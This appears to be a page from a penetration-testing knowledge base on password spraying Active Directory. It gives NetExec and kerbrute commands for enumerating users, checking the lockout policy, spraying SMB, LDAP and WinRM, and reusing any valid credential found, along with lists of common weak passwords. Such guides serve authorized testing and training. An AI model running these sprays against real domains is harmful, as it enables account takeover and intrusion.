---
title: Password-spray a domain or service
slug: password-spraying
area: initial-access
module: 10
order: 2
goal: Find a valid credential by trying one likely password against many accounts, without locking anyone out.
summary: How to password-spray safely — build a user list, pick season/company passwords, spray SMB/LDAP/WinRM/OWA with NetExec or kerbrute, and respect the lockout policy.
prereqs: [A list of valid usernames, Knowledge of (or a guess at) the lockout policy, One spray-worthy password (Season+Year, Company123…)]
seeAlso: [tool:netexec, tool:kerbrute, tool:hydra, howto:roast-kerberos, map:password-cracking]
references:
  - NetExec wiki: checking credentials | https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-domain
  - HackTricks: password spraying (AD) | https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/password-spraying.html
---

Spraying flips brute force around: one password across every user, so no single account racks up failures. It's the quiet way into a domain when you have a user list but no credential. Mind the lockout policy — one spray per window.

## Build the user list

```bash
kerbrute userenum -d corp.local --dc DCIP users.txt          # validate names, no lockout
nxc smb DC -u '' -p '' --rid-brute 10000                     # RID cycle to recover users
```

## Check the lockout policy first

```bash
nxc smb DC -u someuser -p somepass --pass-pol                 # threshold + reset window
enum4linux-ng -P TARGET
```

Stay under the threshold (e.g. try 1–2 passwords, then wait the reset window).

## Spray

```bash
nxc smb DC -u users.txt -p 'Welcome1' --continue-on-success
nxc ldap DC -u users.txt -p 'Autumn2026!' --continue-on-success
nxc winrm DC -u users.txt -p 'Company123'
kerbrute passwordspray -d corp.local --dc DCIP users.txt 'Welcome1'
```

## Good spray passwords

```text
Season + Year:   Autumn2026!  Winter2026   Summer2026!
Company + n:     <Company>1   <Company>2026   <Company>!
Defaults:        Welcome1   Password1   Changeme123
```

## If it fails

- **Accounts locking out**: you exceeded the threshold — stop, wait the full reset window, and spray fewer passwords per round.
- **Everything fails**: widen the user list, try `kerbrute` (pre-auth, no lockout) to test more freely, and rethink the password (company name, local sports team, product).
- **STATUS_PASSWORD_MUST_CHANGE**: that's a *valid* password on an expired account — reset it with `smbpasswd`/`nxc ... -M change-password` and log in.
- **No SMB**: spray LDAP/WinRM/Kerberos/OWA instead.

## Verify

A `[+]` / `(Pwn3d!)` in NetExec is a hit. Confirm where the account is admin, then reuse it (Pass-the-Hash, a shell) or enumerate the domain with it.
